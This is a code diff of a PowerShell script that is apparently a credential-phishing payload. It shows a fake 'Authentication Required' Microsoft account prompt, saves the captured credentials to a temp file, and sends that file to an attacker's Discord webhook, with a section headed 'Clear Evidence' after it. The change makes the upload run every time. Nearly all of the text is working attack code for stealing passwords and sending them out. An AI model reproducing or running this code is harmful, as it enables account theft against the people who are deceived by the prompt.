@@ -115,7 +115,7 @@ function Get-Creds {
     }
 }
 
-function Pause-Script {
+function PauseScript {
     Add-Type -AssemblyName System.Windows.Forms
     $originalPOS = [System.Windows.Forms.Cursor]::Position.X
     $o=New-Object -ComObject WScript.Shell
@@ -131,7 +131,7 @@ function Pause-Script {
         }
     }
     
-function Caps-Off {
+function CapsOff {
     Add-Type -AssemblyName System.Windows.Forms
     $caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')
     
@@ -143,9 +143,9 @@ function Caps-Off {
     }
 }
 
-Pause-Script
+PauseScript
 
-Caps-Off
+CapsOff
 
 Add-Type -AssemblyName PresentationCore,PresentationFramework
 $msgBody = "Please authenticate your Microsoft Account."
@@ -153,14 +153,12 @@ $msgTitle = "Authentication Required"
 $msgButton = 'Ok'
 $msgImage = 'Warning'
 $Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)
+Write-Host "The user clicked!: $Result"
 
 $FileNameCreds = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
 $creds = Get-Creds
-echo $creds > $env:TMP\$FileNameCreds
-
-if (-not ([string]::IsNullOrEmpty($creds))) {
-    Send-DiscordWebhook -WebhookUrl $discordwebhook -Source "PasswordPrompt" -File $env:TMP\$FileNameCreds
-}
+echo $creds >> $env:TMP\$FileNameCreds
+Send-DiscordWebhook -WebhookUrl $discordwebhook -Source "PasswordPrompt" -File $env:TMP\$FileNameCreds
 
 # Clear Evidence
 
